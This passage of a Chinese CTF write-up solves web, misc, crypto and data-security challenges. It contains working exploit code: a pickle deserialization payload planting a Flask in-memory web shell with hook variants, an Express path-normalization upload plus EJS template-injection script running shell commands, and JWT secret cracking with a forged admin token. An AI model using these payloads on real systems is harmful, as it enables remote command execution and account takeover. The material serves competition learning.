=== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;cURL error: <span class="subst">$err</span>\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=== Response from server ===\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$res</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="web2-ezsignin"><a href="#web2-ezsignin" class="headerlink" title="web2 ezsignin*"></a>web2 ezsignin*</h2><blockquote>
<p>一个没写完的文件系统</p>
</blockquote>
<h2 id="web3-ez-blog"><a href="#web3-ez-blog" class="headerlink" title="web3 ez_blog"></a>web3 ez_blog</h2><blockquote>
<p>你能发现博客系统中的漏洞吗？</p>
</blockquote>
<p>提示我们：访客只能用访客账号登录哦！<br>弱口令：<code>guest/guest</code></p>
<p>发现一个十六进制的<code>Token</code>，解码发现有<code>guest is_admin</code>的信息，想到要打<code>pickle</code>反序列化</p>
<p>打<strong>Flask内存马</strong></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>, (<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None,[]).append(lambda :__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read())&quot;</span>,))</span><br><span class="line">        <span class="comment"># return (exec, (&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None,[]).append(lambda :__import__(&#x27;os&#x27;).popen(&#x27;env&#x27;).read())&quot;,))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(b.<span class="built_in">hex</span>())</span><br><span class="line"><span class="comment"># 800495af000000000000008c086275696c74696e73948c04657865639493948c935f5f696d706f72745f5f282773797327292e6d6f64756c65735b275f5f6d61696e5f5f275d2e5f5f646963745f5f5b27617070275d2e6265666f72655f726571756573745f66756e63732e73657464656661756c74284e6f6e652c5b5d292e617070656e64286c616d626461203a5f5f696d706f72745f5f28276f7327292e706f70656e2827656e7627292e7265616428292994859452942e</span></span><br></pre></td></tr></table></figure>
<p>还有一些其他的钩子函数</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># after_request</span></span><br><span class="line"><span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(&#x27;flask&#x27;).make_response(__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read())\&quot;)==None else resp)&quot;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="comment"># teardown_request</span></span><br><span class="line"><span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].teardown_request_funcs.setdefault(None, []).append(lambda error: __import__(&#x27;os&#x27;).popen(__import__(&#x27;flask&#x27;).request.args.get(&#x27;cmd&#x27;)).read())&quot;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="comment"># teardown_appcontext</span></span><br><span class="line"><span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].teardown_appcontext_funcs.append(lambda error: __import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read())&quot;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="comment"># errorhandler</span></span><br><span class="line"><span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()&quot;</span>,))</span><br></pre></td></tr></table></figure>
<h2 id="web4-auth-web"><a href="#web4-auth-web" class="headerlink" title="web4 auth_web*"></a>web4 auth_web*</h2><blockquote>
<p>为了系统安全，我在自己的开源项目代码中加入了认证方式</p>
</blockquote>
<p>我丢，虽然有<code>jar反编译工具</code>，但是懒啊……</p>
<h2 id="web5-staticNodeService"><a href="#web5-staticNodeService" class="headerlink" title="web5 staticNodeService"></a>web5 staticNodeService</h2><blockquote>
<p>http.server is a great tool. So I also created one using node.js</p>
</blockquote>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">const express = require(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line">const ejs = require(<span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">const fs = require(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line">const path = require(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line">const app = express();</span><br><span class="line">const PORT = parseInt(process.env.PORT) || <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="built_in">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.use(express.json(&#123;</span><br><span class="line">    limit: <span class="string">&#x27;1mb&#x27;</span></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">const STATIC_DIR = path.join(__dirname, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"></span><br><span class="line">// serve index <span class="keyword">for</span> better viewing</span><br><span class="line">function serveIndex(req, res) &#123;</span><br><span class="line">    var templ = req.query.templ || <span class="string">&#x27;index&#x27;</span>;</span><br><span class="line">    var lsPath = path.join(__dirname, req.path);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        res.render(templ, &#123;</span><br><span class="line">            filenames: fs.readdirSync(lsPath),</span><br><span class="line">            path: req.path</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">        console.log(e);</span><br><span class="line">        res.status(<span class="number">500</span>).send(<span class="string">&#x27;Error rendering page&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// static serve <span class="keyword">for</span> simply view/download</span><br><span class="line">app.use(express.static(STATIC_DIR));</span><br><span class="line"></span><br><span class="line">// Security middleware</span><br><span class="line">app.use((req, res, <span class="built_in">next</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (typeof req.path !== <span class="string">&#x27;string&#x27;</span> ||</span><br><span class="line">        (typeof req.query.templ !== <span class="string">&#x27;string&#x27;</span> &amp;&amp; typeof req.query.templ !== <span class="string">&#x27;undefined&#x27;</span>)</span><br><span class="line">    ) res.status(<span class="number">500</span>).send(<span class="string">&#x27;Error parsing path&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (/js$|\.\./i.test(req.path)) res.status(<span class="number">403</span>).send(<span class="string">&#x27;Denied filename&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">next</span>();</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">// logic middleware</span><br><span class="line">app.use((req, res, <span class="built_in">next</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.path.endsWith(<span class="string">&#x27;/&#x27;</span>)) serveIndex(req, res);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">next</span>();</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">// Upload operation handler</span><br><span class="line">app.put(<span class="string">&#x27;/*&#x27;</span>, (req, res) =&gt; &#123;</span><br><span class="line">    const filePath = path.join(STATIC_DIR, req.path);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fs.existsSync(filePath)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.status(<span class="number">500</span>).send(<span class="string">&#x27;File already exists&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fs.writeFile(filePath, Buffer.<span class="keyword">from</span>(req.body.content, <span class="string">&#x27;base64&#x27;</span>), (err) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.status(<span class="number">500</span>).send(<span class="string">&#x27;Error writing file&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        res.status(<span class="number">201</span>).send(<span class="string">&#x27;File created/updated&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// Server start</span><br><span class="line">app.listen(PORT, () =&gt; &#123;</span><br><span class="line">    console.log(`Static server <span class="keyword">is</span> running on http://localhost:$&#123;PORT&#125;`);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p><code>2024CISCN</code>决赛<code>web-ezjs</code><strong>修复版</strong>，甚至非预期(<code>.ejs/.../</code>)都给修了，目前的难题在于，如何绕过<code>js$</code>这个正则</p>
<p>可以通过<code>express</code>的<strong>路径规范化</strong>特性，让<code>/readflag.ejs/.</code>，解析为<code>/readflag.ejs</code>，实现文件上传</p>
<p>然后就是<strong>模板注入</strong>，这里<code>/flag</code>给的是<strong>400</strong>的权限，但是可以读<code>/readflag</code></p>
<p>注意了，这里不要使用<code>Python</code>的<code>request</code>的<code>put</code>方法，它会在这一步就帮你<strong>提前路径规范化</strong>了</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_put_request</span>():</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">3000</span>))</span><br><span class="line">    content = <span class="string">&#x27;&lt;%= global.process.mainModule.require(\&#x27;child_process\&#x27;).execSync(\&#x27;/readflag\&#x27;).toString() %&gt;&#x27;</span></span><br><span class="line">    encoded_content = base64.b64encode(content.encode()).decode()</span><br><span class="line">    body = <span class="string">f&#x27;&#123;&#123;&quot;content&quot;:&quot;<span class="subst">&#123;encoded_content&#125;</span>&quot;&#125;&#125;&#x27;</span></span><br><span class="line">    request = (</span><br><span class="line">        <span class="string">f&quot;PUT /readflag.ejs/. HTTP/1.1\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;Host: localhost:3000\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;Content-Type: application/json\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;Content-Length: <span class="subst">&#123;<span class="built_in">len</span>(body)&#125;</span>\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;Connection: close\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;<span class="subst">&#123;body&#125;</span>&quot;</span></span><br><span class="line">    )</span><br><span class="line">    s.send(request.encode())</span><br><span class="line">    response = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        chunk = s.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        response += chunk</span><br><span class="line"></span><br><span class="line">    s.close()</span><br><span class="line">    <span class="keyword">return</span> response.decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_get_request</span>():</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">3000</span>))</span><br><span class="line">    request = (</span><br><span class="line">        <span class="string">&quot;GET /?templ=../readflag.ejs HTTP/1.1\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;Host: localhost:3000\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;Connection: close\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    )</span><br><span class="line">    s.send(request.encode())</span><br><span class="line">    response = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        chunk = s.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        response += chunk</span><br><span class="line"></span><br><span class="line">    s.close()</span><br><span class="line">    <span class="keyword">return</span> response.decode()</span><br><span class="line"></span><br><span class="line">put_response = send_put_request()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;PUT请求响应:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(put_response)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">50</span> + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">get_response = send_get_request()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;GET请求响应:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(get_response)</span><br></pre></td></tr></table></figure>
<h2 id="web6-evil-login"><a href="#web6-evil-login" class="headerlink" title="web6 evil_login*"></a>web6 evil_login*</h2><blockquote>
<p>can u login?<br>hint: guest/guest1234</p>
</blockquote>
<p><strong>jwt伪造</strong>，<code>python jwt_tool.py xxxx -C -d jwt_key.txt</code><br>用字典爆出来<code>admin123</code></p>
<p>工具：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/ticarpi/jwt_tool">jwt tool</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list">jwt字典</a></li>
<li><a target="_blank" rel="noopener" href="https://www.jwt.io/">加解密jwt</a></li>
</ul>
<p>改<code>auth_token</code></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.-M2fBkjjUddPWmGOAcZ9tDfpZBnCWlfrvIkaOQifNYk; </span><br><span class="line">session=eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIlx1NzY3Ylx1NWY1NVx1NjIxMFx1NTI5ZiJdfV19.aOp9iw.FpTLQhPK5QntjW-gd3PBsbM9Thk</span><br></pre></td></tr></table></figure>
<p><code>admin</code>了然后呢？这<code>session</code>好像也没什么用，没有下一步的指示了，<code>web</code>也脑洞是吧……</p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="别笑，你试你也过不了第二关"><a href="#别笑，你试你也过不了第二关" class="headerlink" title="别笑，你试你也过不了第二关"></a>别笑，你试你也过不了第二关</h2><blockquote>
<p>来试试闯关拿下flag吧！</p>
</blockquote>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">请编写代码使字符串 hilogo 的内容为以下图案：</span><br><span class="line"></span><br><span class="line"><span class="comment">#####  #####   ###   #      #      ##### ##### ##### #####   ###   #      #      #####</span></span><br><span class="line"><span class="comment">#        #    #   #  #      #      #   # #     #       #    #   #  #      #      #   #</span></span><br><span class="line"><span class="comment">#        #    #####  #      #      #   # #     #       #    #####  #      #      #   #</span></span><br><span class="line"><span class="comment">#        #    #   #  #      #      #   # #     #       #    #   #  #      #      #   #</span></span><br><span class="line"><span class="comment">#####  #####  #   #  #####  #####  ##### ##### ##### #####  #   #  #####  #####  #####</span></span><br></pre></td></tr></table></figure>
<p>这里应该是<strong>Python沙箱</strong>，那我们用<strong>简单的运算</strong>拼接一下</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&#x27;#&#x27;</span>*<span class="number">5</span>;d=<span class="string">&#x27;#   #&#x27;</span>;c=a+<span class="string">&#x27; &#x27;</span>;p=c+<span class="string">&#x27; &#x27;</span>+a;l2=<span class="string">&quot;#        #    #   #  #      #      #   # #     #       #    #   #  #      #      #   #&quot;</span>;b=<span class="string">&#x27;   ###   #      #      &#x27;</span>;q=<span class="string">&#x27;  &#x27;</span>+d+<span class="string">&#x27;  &#x27;</span>+a+<span class="string">&#x27;  &#x27;</span>+a;l1=p+b+c*<span class="number">3</span>+a+b+a;l5=p+q+<span class="string">&#x27;  &#x27;</span>+(c*<span class="number">3</span>+a)+q+<span class="string">&#x27;  &#x27;</span>+a;l3=l2.replace(d,a);hilogo=<span class="string">f&#x27;<span class="subst">&#123;l1&#125;</span>\n<span class="subst">&#123;l2&#125;</span>\n<span class="subst">&#123;l3&#125;</span>\n<span class="subst">&#123;l2&#125;</span>\n<span class="subst">&#123;l5&#125;</span>&#x27;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">请编写 code 以输出前<span class="number">0x114514</span>个数的序数词后缀（小于<span class="number">37</span>长度）:</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_ordinal</span>(<span class="params">n</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="number">10</span> &lt;= n % <span class="number">100</span> &lt;= <span class="number">20</span>:</span><br><span class="line">                suffix = <span class="string">&#x27;th&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                suffix = [<span class="string">&#x27;st&#x27;</span>, <span class="string">&#x27;nd&#x27;</span>, <span class="string">&#x27;rd&#x27;</span>, <span class="string">&#x27;th&#x27;</span>, <span class="string">&#x27;th&#x27;</span>, <span class="string">&#x27;th&#x27;</span>, <span class="string">&#x27;th&#x27;</span>, <span class="string">&#x27;th&#x27;</span>, <span class="string">&#x27;th&#x27;</span>, <span class="string">&#x27;th&#x27;</span>][n % <span class="number">10</span> - <span class="number">1</span>]</span><br><span class="line">                <span class="keyword">return</span> suffix</span><br><span class="line">                </span><br><span class="line">            test_passed = <span class="literal">True</span></span><br><span class="line">            user_function = <span class="built_in">eval</span>(<span class="string">f&quot;lambda n: <span class="subst">&#123;&lt;span style=<span class="string">&#x27;color: red;&#x27;</span>&gt;code&lt;/span&gt;&#125;</span>&quot;</span>, &#123;&#125;, &#123;&#125;)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">0x114514</span>):</span><br><span class="line">    <span class="keyword">if</span> user_function(i) != get_ordinal(i):</span><br><span class="line">        test_passed = <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<p>第二关没打出来<br>好吧，赛后发现原来是<a target="_blank" rel="noopener" href="https://codegolf.stackexchange.com/questions/4707/outputting-ordinal-numbers-1st-2nd-3rd">code golf的例题</a><br><code>&#39;tsnrhtdd&#39;[n%5*(n%100^15&gt;4&gt;n%10)::4]</code></p>
<h2 id="misc3-成功男人背后的女人"><a href="#misc3-成功男人背后的女人" class="headerlink" title="misc3 成功男人背后的女人"></a>misc3 成功男人背后的女人</h2><blockquote>
<p>每个成功的男人背后都站着一个伟大的女人。</p>
</blockquote>
<p><code>tweakpng</code>看了一下，一开始像<strong>IDAT隐写</strong>，但也发现了大量的<strong>mkBT块</strong>，搜索发现是<strong>Adobe专属</strong>的数据块，下个<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1tkT3geGDKkl2fGCIe8H7MA?pwd=pbn7">firework</a></p>
<p><img src="https://img1.tucang.cc/api/image/show/9d7ec173482d062e82dad69de8e07adf" alt=""></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>1000100010000010101001101000011</span><br><span class="line"><span class="number">0</span>1010100010001100111101101110111</span><br><span class="line">00110000011011010100010101001110</span><br><span class="line"><span class="number">0</span>1011111011000100110010101101000</span><br><span class="line">00110001011011100100010001011111</span><br><span class="line"><span class="number">0</span>1001101010001010110111001111101</span><br></pre></td></tr></table></figure>
<p><code>DASCTF&#123;w0mEN_beh1nD_MEn&#125;</code></p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="瑞德的一生"><a href="#瑞德的一生" class="headerlink" title="瑞德的一生"></a>瑞德的一生</h2><blockquote>
<p>瑞德的一生坎坷，你能不能帮帮他</p>
</blockquote>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> legendre</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">p, q = getPrime(<span class="number">256</span>), getPrime(<span class="number">256</span>)</span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">x = getRandomRange(<span class="number">0</span>, n)</span><br><span class="line"><span class="keyword">while</span> legendre(x, p) != -<span class="number">1</span> <span class="keyword">or</span> legendre(x, q) != -<span class="number">1</span>:</span><br><span class="line">    x = getRandomRange(<span class="number">0</span>, n)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">msg , n, x</span>):</span><br><span class="line">    y = getRandomRange(<span class="number">0</span>, n) </span><br><span class="line">    enc = []</span><br><span class="line">    <span class="keyword">while</span> msg:</span><br><span class="line">        bit = msg &amp; <span class="number">1</span></span><br><span class="line">        msg &gt;&gt;= <span class="number">1</span></span><br><span class="line">        enc.append((<span class="built_in">pow</span>(y, <span class="number">2</span>) * <span class="built_in">pow</span>(x, bit)) % n)</span><br><span class="line">        y += getRandomRange(<span class="number">1</span>, <span class="number">2</span>**<span class="number">48</span>)</span><br><span class="line">    <span class="keyword">return</span> enc</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>\n&quot;</span>)</span><br><span class="line">    file.write(<span class="string">f&quot;x = <span class="subst">&#123;x&#125;</span>\n&quot;</span>)</span><br><span class="line">    file.write(<span class="string">f&quot;enc = <span class="subst">&#123;encrypt(m, n, x)&#125;</span>\n&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><code>github</code>搜索关键代码<code>enc.append((pow(y, 2) * pow(x, bit)) % n)</code>就是<a target="_blank" rel="noopener" href="https://willwam.me/posts/2022-07-29-diceathope-smallfortune">原题</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span>(<span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">resultant</span>(<span class="params">f1, f2, var</span>):</span><br><span class="line">    <span class="keyword">return</span> Matrix(f1.sylvester_matrix(f2, var)).determinant()</span><br><span class="line"></span><br><span class="line">pgcd = <span class="keyword">lambda</span> g1, g2: g1.monic() <span class="keyword">if</span> <span class="keyword">not</span> g2 <span class="keyword">else</span> pgcd(g2, g1%g2)</span><br><span class="line"></span><br><span class="line">P.&lt;y, k&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">p1 = x * y^<span class="number">2</span> - enc[<span class="number">0</span>]</span><br><span class="line">p2 = (y + k)^<span class="number">2</span> - enc[<span class="number">1</span>]</span><br><span class="line">p3 = resultant(p1, p2, y)</span><br><span class="line">k = <span class="built_in">min</span>(p3.univariate_polynomial().monic().small_roots())</span><br><span class="line"></span><br><span class="line">P.&lt;y&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">p1 = x * y^<span class="number">2</span> - enc[<span class="number">0</span>]</span><br><span class="line">p2 = (y + k)^<span class="number">2</span> - enc[<span class="number">1</span>]</span><br><span class="line">p4 = pgcd(p1, p2)</span><br><span class="line">y = n - p4.coefficients()[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line">P.&lt;k&gt; = PolynomialRing(Zmod(n))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> tqdm(enc[::-<span class="number">1</span>]):</span><br><span class="line">    flag &lt;&lt;= <span class="number">1</span></span><br><span class="line">    poly = x * (y+k)^<span class="number">2</span> - c</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(poly.monic().small_roots()):</span><br><span class="line">        flag += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag))</span><br></pre></td></tr></table></figure>
<h2 id="Ridiculous-LFSR"><a href="#Ridiculous-LFSR" class="headerlink" title="Ridiculous LFSR*"></a>Ridiculous LFSR*</h2><blockquote>
<p>What? You call this LFSR?</p>
</blockquote>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = flag.strip(<span class="string">b&quot;DASCTF&#123;&quot;</span>).strip(<span class="string">b&quot;&#125;&quot;</span>)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">LENGTH = m.bit_length()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LFSR</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,length</span>):</span><br><span class="line">        self.seed = urandom(<span class="number">32</span>)</span><br><span class="line">        self.length = length</span><br><span class="line">        seed(self.seed)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> getrandbits(self.length)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rotate</span>(<span class="params">msg,l=<span class="number">1</span></span>):</span><br><span class="line">    temp = <span class="built_in">bin</span>(msg)[<span class="number">2</span>:].zfill(LENGTH)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(temp[l:] + temp[:l],<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lfsr = LFSR(LENGTH)</span><br><span class="line">c = []</span><br><span class="line">l = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    temp = lfsr.<span class="built_in">next</span>()</span><br><span class="line">    c.append(temp ^ m)</span><br><span class="line">    l.append(<span class="built_in">bin</span>(temp)[<span class="number">2</span>:].count(<span class="string">&quot;1&quot;</span>))</span><br><span class="line">    m = rotate(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&quot;LENGTH = &quot;</span> + <span class="built_in">str</span>(LENGTH) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">&quot;c = &quot;</span> + <span class="built_in">str</span>(c) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">&quot;l = &quot;</span> + <span class="built_in">str</span>(l) + <span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>发现有<code>AI</code>梭哈的<code>wp</code>，<code>ChatGPT-Pro</code>这么吊吗？哈人</p>
<h1 id="DS-amp-Ai"><a href="#DS-amp-Ai" class="headerlink" title="DS&amp;Ai"></a>DS&amp;Ai</h1><h2 id="DS-amp-Ai1-SM4-OFB"><a href="#DS-amp-Ai1-SM4-OFB" class="headerlink" title="DS&amp;Ai1 SM4-OFB"></a>DS&amp;Ai1 SM4-OFB</h2><blockquote>
<p>我得到了由某个密钥加密过的部分数据，其中，已知第一条记录的明文为：<br>蒋宏玲         17145949399         220000197309078766<br>你能帮我解密所有数据吗？将”何浩璐”的身份证号的md5值作为flag提交</p>
</blockquote>
<p><code>ChatGPT</code>一把梭</p>
<p><code>SM4-OFB</code> 是流式模式：对每个字段用相同的 <code>IV/密钥</code>从 <code>IV</code> 产生的 <code>keystream</code> 与明文异或得到密文<br>利用已知明文（第一条记录的姓名/手机号/身份证），把对应的密文 <code>XOR</code> 明文 得到三个字段的 <code>keystream</code><br>用得到的 <code>keystream</code> 分别 <code>XOR</code> 所有记录对应字段的密文，得到所有记录的明文</p>
